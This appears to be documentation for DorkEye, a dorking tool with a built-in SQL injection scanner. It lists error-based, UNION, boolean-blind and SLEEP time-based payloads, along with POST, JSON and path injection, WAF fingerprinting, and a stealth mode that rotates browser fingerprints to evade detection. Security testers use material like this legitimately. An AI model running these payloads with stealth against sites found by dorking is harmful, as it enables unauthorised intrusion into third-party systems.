# SQL Injection | DorkEye Project

DorkEye includes a built-in multi-method SQL injection engine that works on any URL with query parameters — no external tools required.

---

## Enable SQLi Testing

### During a dork search

```bash
python dorkeye.py -d "inurl:.php?id=" --sqli -o results.json
python dorkeye.py --dg=sqli --mode=medium --sqli --stealth -o results.json
```

### Direct test on a single URL

```bash
# SQLi auto-enabled — no --sqli flag needed
python dorkeye.py -u "https://example.com/page.php?id=1"

# With stealth and output
python dorkeye.py -u "https://example.com/page.php?id=1" --sqli --stealth -o result.json
```

### Re-test a saved results file

```bash
python dorkeye.py -f Dump/results.json --sqli -o retest.json
```

---

## Architecture Overview

`Tools/sqli_detector.py` is a self-contained module. Its main components:

| Component | Description |
|-----------|-------------|
| `SQLiConfidence` | Enum: `none → low → medium → high → critical` |
| `HTTPFingerprint` | Immutable dataclass holding UA, Accept, Sec-Fetch, Cache-Control and related fields |
| `HTTPFingerprintRotator` | Loads `http_fingerprints.json` and rotates browser profiles on every request |
| `CircuitBreaker` | Tracks unreachable hosts to avoid repeated timeouts |
| `_ScriptStripper` | HTMLParser-based: strips `<script>…</script>` blocks before error pattern matching |
| `WAF_SIGNATURES` | Dict of detection signatures for 12 known WAFs |
| `SQLiDetector` | Main class — orchestrates all detection methods |

---

## HTTP Fingerprint Rotation

Every outgoing request automatically rotates its browser profile to blend in with real user traffic.

`HTTPFingerprintRotator` supports two JSON schema modes:

| Mode | Schema | Description |
|------|--------|-------------|
| `legacy` | Flat dict of fingerprint objects | Each entry is a self-contained profile |
| `advanced` | Shared header references + language profiles | Common headers via `@reference` tokens, Accept-Language via named profiles |

`http_fingerprints.json` is loaded from the DorkEye root (one level above `Tools/`).  
If the file is missing or malformed, fingerprinting is disabled and a minimal fallback UA is used.

```python
rotator.get_random()                              # random profile selection
rotator.get_next()                                # round-robin selection
headers = rotator.build_headers(referer="https://google.com")  # ready-to-use headers dict
```

Built-in UA pool (used as fallback when `http_fingerprints.json` is unavailable):

| Browser | Platforms |
|---------|-----------|
| Chrome | Windows, macOS, Linux |
| Firefox | Windows, macOS, Linux |
| Safari | macOS, iOS |
| Edge | Windows |

---

## Circuit Breaker

`CircuitBreaker` tracks dead hosts at `scheme://netloc` granularity, preventing repeated timeouts against the same unreachable target.

```python
cb = CircuitBreaker()
cb.mark_dead("https://target.com/page?id=1")  # marks the host
cb.is_dead("https://target.com/other?q=2")    # → True (same host)
cb.reset()                                      # re-enables all hosts
```

Any `ConnectTimeout` or `ConnectionError` inside `_run_interruptible()` automatically calls `mark_dead()` on the offending host.

---

## Script Tag Stripping (CWE-20 / CWE-116 / CWE-185 fix)

Before applying SQL error pattern matching, the response body is passed through `_ScriptStripper` — an `HTMLParser` subclass that removes all `<script>…</script>` blocks.

This prevents false positives caused by:
- SQL error string literals embedded in client-side JavaScript bundles
- Injected payloads that survive as inert JS text rather than as executed HTML

If the parser raises an exception, a regex fallback is used:

```python
_SCRIPT_TAG_RE_FALLBACK = re.compile(
    r"<script(?:[^>]*)>[\s\S]*?</script\s*>", re.IGNORECASE
)
```

---

## Timing Constants (Termux-aware)

The module auto-detects Termux/Android and lowers timeouts and sample counts to compensate for constrained device resources.

```python
TERMUX_IS_ANDROID = _detect_termux()
# Detection based on: TERMUX_VERSION env var, /data/data/com.termux PREFIX, or directory presence
```

| Constant | Desktop | Termux/Android |
|----------|---------|----------------|
| `_CONNECT_TIMEOUT` | 4 s | 3 s |
| `_DEFAULT_READ` | 8 s | 6 s |
| `_BASELINE_SAMPLES` | 2 | 1 |
| `_PROBE_SAMPLES` | 3 | 2 |
| `_BOOL_SAMPLES` | 3 | 2 |
| `_TIMEBASED_CONFIRM` | 2 | 1 |
| `_SLEEP_DELAY` | 3 s | 3 s |
| `_TIMEBASED_MARGIN` | 2.5 s | 2.5 s |
| `_MAX_BASELINE_S` | 6.0 s | 6.0 s |
| `_UNION_COLUMNS_MAX` | 5 | 5 |

All in-loop sleeps use `_interruptible_sleep()`, which polls the interrupt flags every 0.25 s and returns early if either is set.

---

## Interrupt Flags

Interrupt flags are module-level booleans to guarantee immediate propagation without circular imports:

```python
_exit_requested: bool = False   # Ctrl+C → abort everything
_skip_current:   bool = False   # second Ctrl+C → skip current URL only
```

`dorkeye.py` sets these inside its SIGINT handler after each Ctrl+C. Every internal loop (`_run_interruptible`, `_interruptible_sleep`, payload `for` loops) checks them at each iteration.

---

## Detection Methods

DorkEye runs **7 complementary methods** across GET parameters, POST form fields, JSON body keys, and URL path segments.

### GET Parameters (methods 1–4)

Before the full test suite runs, an **adaptive pre-probe** injects a single quote (`1'`) into each parameter and measures response deviation from the baseline using `difflib.SequenceMatcher`. Parameters whose natural noise already exceeds 18% (`_PROBE_MAX_THRESHOLD`) are skipped entirely. For the remaining parameters, the probe threshold is set adaptively: `noise_level + 0.04`.

```
_PROBE_NOISE_BUFFER  = 0.04   # adaptive buffer added on top of measured noise
_PROBE_MAX_THRESHOLD = 0.18   # skip parameter if natural noise already exceeds this
```

---

#### 1. Error-based

Injects payloads designed to trigger DB error signatures in the response body.

**Payloads:**

```
1' AND extractvalue(0,concat(0x7e,'TEST',0x7e)) AND '1'='1
1 AND 1=CAST(CONCAT(0x7e,'TEST',0x7e) as INT)
1'; SELECT NULL#
```

**Error signatures per database:**

| Database | Signatures |
|----------|------------|
| MySQL / MariaDB | `You have an error in your SQL syntax`, `Warning.*mysqli?_`, `MySQLSyntaxErrorException`, `valid MySQL result`, `mysql_num_rows()`, `mysql_fetch_(array\|assoc\|row\|object)`, `MySQL server version for the right syntax`, `com.mysql.jdbc.exceptions` |
| PostgreSQL | `PostgreSQL.*ERROR`, `Warning.*\bpg_`, `valid PostgreSQL result`, `Npgsql.`, `org.postgresql.util.PSQLException`, `ERROR: syntax error at or near`, `ERROR: unterminated quoted string` |
| MSSQL | `Driver.*SQL Server`, `OLE DB.*SQL Server`, `SQLServer JDBC Driver`, `Microsoft SQL Native Client error`, `ODBC SQL Server Driver`, `Unclosed quotation mark after the character string`, `Microsoft OLE DB Provider for SQL Server`, `[Microsoft][ODBC SQL Server Driver]`, `Incorrect syntax near` |
| Oracle | `Oracle error`, `Oracle.*Driver`, `Warning.*\boci_`, `ORA-\d{5}`, `oracle.jdbc.driver`, `quoted string not properly terminated` |
| SQLite | `SQLite/JDBCDriver`, `SQLite.Exception`, `System.Data.SQLite.SQLiteException`, `sqlite3.OperationalError:`, `near "...": syntax error` |

Confidence: **HIGH** on first match — returns immediately, no further methods run for that parameter.

In stealth mode: random delay of 1.5–3 s between payloads.

---

#### 2. UNION-based

Probes column counts from 1 to `_UNION_COLUMNS_MAX` (5) using four payload variants per count.

**Payloads (per n_cols):**

```
' UNION SELECT NULL[,NULL...]--
' UNION SELECT NULL[,NULL...]#
-1 UNION SELECT NULL[,NULL...]--
0 UNION ALL SELECT NULL[,NULL...]--
```

**Column-mismatch signatures:**

```
The used SELECT statements have a different number of columns
each UNION query must have the same number of columns
SELECTs to the left and right of UNION do not have the same number
ORA-01789
column count doesn't match
```

Detection logic:
- **HIGH** — a DB error signature fires during a UNION probe
- **MEDIUM** — response size delta > 20% of baseline AND at least one prior column mismatch was recorded
- **LOW** — column mismatches recorded but no size anomaly confirmed

In stealth mode: random delay of 0.5–1.5 s between payloads.

---

#### 3. Boolean blind

Sends two true/false condition pairs and collects multiple response-size samples per payload.

**Payloads:**

```
1' AND '1'='1   →  true condition
1' AND '1'='2   →  false condition
1 AND 1=1       →  true condition
1 AND 1=2       →  false condition
```

**Detection logic:** the median response sizes for true vs. false conditions must differ by more than **15%** of the baseline AND the internal variance within each group must stay below the **4%** noise ceiling.

Confidence: **MEDIUM** on positive detection.  
Samples per payload: `3` (desktop) / `2` (Termux).

In stealth mode: random delay of 0.5–1 s between samples, 1–2 s between payload pairs.

---

#### 4. Time-based blind

Injects `SLEEP` payloads and measures actual elapsed wall-clock time against a measured per-URL baseline.

**Payloads:**

```
1' AND SLEEP(3) AND '1'='1
1 AND SLEEP(3)
```

**Threshold:** `baseline_latency + _SLEEP_DELAY(3s) + _TIMEBASED_MARGIN(2.5s)`

After a delay is detected, a neutral payload (`1' AND '1'='1`) is sent `_TIMEBASED_CONFIRM` times (2× desktop / 1× Termux) to confirm the host responds quickly without delays. All confirmation requests must complete below `baseline + 2.5 s` for the finding to be recorded.

Confidence: **MEDIUM** on confirmed time-based delay.

Note: if the host is unreachable during baseline measurement, or baseline latency exceeds `_MAX_BASELINE_S` (6.0 s), the method is skipped entirely.

---

### POST Parameters (method 5)

`test_post_sqli(url, post_data)` tests all form POST parameters using error-based detection.

**Payload:** each parameter value is suffixed with a single quote (`value'`).

WAF detection runs on the baseline GET response and on each POST response. WAF-blocked parameters are skipped.

Confidence: **HIGH** per parameter if a DB error signature matches (score 3). `overall_confidence` is HIGH if average score ≥ 3, MEDIUM otherwise.

```python
result = detector.test_post_sqli(
    "https://example.com/login",
    {"username": "admin", "password": "pass"}
)
```

---

### JSON Body Parameters (method 6)

`test_json_sqli(url, json_data)` sends POST requests with `Content-Type: application/json` and tests each string-valued key.

**Payload:** same single-quote suffix (`value'`) appended to each JSON field value.

WAF detection runs on every response. WAF-flagged parameters are skipped and recorded in `waf_detected`.

```python
result = detector.test_json_sqli(
    "https://api.example.com/users",
    {"id": "1", "name": "test"}
)
```

---

### Path-based Parameters (method 7)

`test_path_based_sqli(url)` appends a single quote to the last numeric or word path segment.

**Trigger:** URL path matches `/\d+$` or `/\w+$`

**Payload:** `url + "'"`

Example: `https://example.com/products/42` → `https://example.com/products/42'`

Confidence: **HIGH** if a DB error signature matches in the response.

---

## Parameter Prioritization

Parameters are sorted into three tiers before testing begins. Higher-priority parameters are tested first; if a **CRITICAL** finding is returned on the first parameter, testing stops immediately.

| Priority | Criteria |
|----------|----------|
| High | Numeric value (`?id=3`) or name in the high-priority set |
| Medium | Name in the medium-priority set |
| Low | Everything else |

**High-priority names:** `id`, `pid`, `uid`, `nid`, `tid`, `cid`, `rid`, `eid`, `fid`, `gid`, `page`, `pg`, `p`, `num`, `item`, `product`, `prod`, `article`, `cat`, `category`, `sort`, `order`, `by`, `type`, `idx`, `index`, `ref`, `record`, `row`, `entry`, `post`, `news`, `view`

**Medium-priority names:** `search`, `q`, `query`, `s`, `keyword`, `kw`, `term`, `find`, `name`, `user`, `username`, `login`, `email`, `mail`, `city`, `country`, `region`, `lang`, `language`, `filter`, `tag`, `label`, `topic`, `subject`, `section`

---

## Scoring System

Each method contributes points toward `overall_confidence` for that parameter:

| Method | Condition | Points |
|--------|-----------|--------|
| Error-based | HIGH confidence | 3 — immediate return |
| Union-based | HIGH confidence | 3 |
| Union-based | MEDIUM confidence | 2 |
| Union-based | LOW confidence | 1 |
| Boolean blind | any positive | 2 |
| Time-based blind | HIGH confidence | 3 |
| Time-based blind | MEDIUM confidence | 2 |

Final `overall_confidence` is determined by the **best per-parameter score** across all tested parameters:

| Best score | `overall_confidence` |
|------------|----------------------|
| ≥ 5 | `critical` |
| ≥ 3 or average ≥ 3 | `high` |
| ≥ 2 or average ≥ 2 | `medium` |
| < 2 | `low` |

---

## Confidence Levels

| Level | Meaning |
|-------|---------|
| `critical` | Multiple methods confirmed — combined score ≥ 5 |
| `high` | Strong single-method hit — error signature matched or score ≥ 3 |
| `medium` | Behavioral anomaly — UNION col mismatch, boolean differential, or confirmed time delay |
| `low` | Weak signal — minor response variation, col mismatches only |

---

## WAF Detection

WAF checks run on the baseline response and on each injected response. Signatures are matched against:
- Response header **keys** (lowercased)
- Response header **values** (joined, lowercased)
- Response **body** (first 2000 chars, lowercased)
- HTTP **status code** (403 / 406 / 419 / 429 with body < 600 chars → `generic_waf`)

**Detected WAFs:**

| WAF | Detection signals |
|-----|-------------------|
| Cloudflare | `cf-ray`, `__cfduid`, `cloudflare`, `attention required! \| cloudflare` |
| mod_security | `mod_security`, `modsecurity`, `406 not acceptable`, `not acceptable!` |
| Wordfence | `wordfence`, `generated by wordfence` |
| Sucuri | `x-sucuri-id`, `sucuri website firewall`, `access denied - sucuri` |
| Imperva | `x-iinfo`, `incapsula incident`, `_incap_ses_` |
| Akamai | `akamai`, `x-akamai-transformed`, `reference #18` |
| F5 BIG-IP | `x-waf-event-info`, `bigipserver`, `the requested url was rejected` |
| Barracuda | `barra_counter_session`, `barracuda` |
| FortiWeb | `fortigate`, `fortiweb` |
| AWS WAF | `x-amzn-requestid`, `awselb`, `forbidden - aws waf` |
| DenyAll | `denyall`, `x-denyall` |
| Reblaze | `x-reblaze-protection` |

When a WAF is detected, the aggressive payload set for that method is aborted for the current URL. The WAF name is stored in `waf_detected` in the result dict.

---

## Return Value Structure

`test_sqli(url)` returns:

```json
{
  "url":                "https://target.com/page.php?id=1",
  "tested":             true,
  "vulnerable":         true,
  "overall_confidence": "critical",
  "waf_detected":       null,
  "message":            "Tested 2 parameter(s)",
  "tests": [
    {
      "method":     "error_based",
      "vulnerable": true,
      "confidence": "high",
      "evidence":   ["MYSQL error signature matched: You have an error in your SQL syntax"],
      "waf":        null
    },
    {
      "method":     "time_based_blind",
      "vulnerable": true,
      "confidence": "medium",
      "evidence":   ["Time-based confirmed: SLEEP elapsed=5.3s  threshold=5.2s  neutral avg=0.21s  baseline=0.18s"],
      "waf":        null
    }
  ]
}
```

`test_post_sqli` and `test_json_sqli` return the same top-level shape with per-parameter entries in `tests`.

`test_path_based_sqli` returns a flat dict with `method`, `vulnerable`, `confidence`, and `evidence`.

---

## Terminal Output

```
[!] Potential SQLi found (critical): https://target.com/product.php?id=7
    ↳ method: error_based [param: id]  evidence: MYSQL error signature matched: extractvalue(0,...
    ↳ method: time_based_blind          evidence: SLEEP(3) triggered: elapsed=5.3s > threshold=5.2s
```

---

## HTML Report Integration

Vulnerable URLs are shown with:
- Color-coded badge: 🟣 CRITICAL / 🔴 VULN / 🟢 SAFE / ⬛ UNTESTED
- WAF indicator in the WAF column
- ⓘ detail popup with method, payload evidence, and confidence level

---

## Stealth Mode

```bash
python dorkeye.py -d dorks.txt --sqli --stealth -o results.json
```

With `--stealth`:

| Phase | Normal | Stealth |
|-------|--------|---------|
| Between parameters | — | 2–4 s random delay |
| Between error-based payloads | — | 1.5–3 s random delay |
| Between UNION payloads | — | 0.5–1.5 s random delay |
| Between boolean samples | — | 0.5–1 s random delay |
| Between boolean payload pairs | — | 1–2 s random delay |
| Fingerprint profiles | all | conservative browser profiles |

---

## Python API

```python
from Tools.sqli_detector import SQLiDetector

detector = SQLiDetector(stealth=False, timeout=8)

# GET parameters
result = detector.test_sqli("https://example.com/page.php?id=1&cat=3")

# POST form
result = detector.test_post_sqli(
    "https://example.com/login",
    {"username": "admin", "password": "pass"}
)

# JSON body
result = detector.test_json_sqli(
    "https://api.example.com/users",
    {"id": "1", "name": "test"}
)

# Path segment
result = detector.test_path_based_sqli("https://example.com/products/42")

# Optional progress callback (used by dorkeye.py for the progress bar)
detector._status_cb = lambda phase: print(f"[sqli] {phase}")

# Reset circuit breaker between independent scans
detector.circuit_breaker.reset()
```
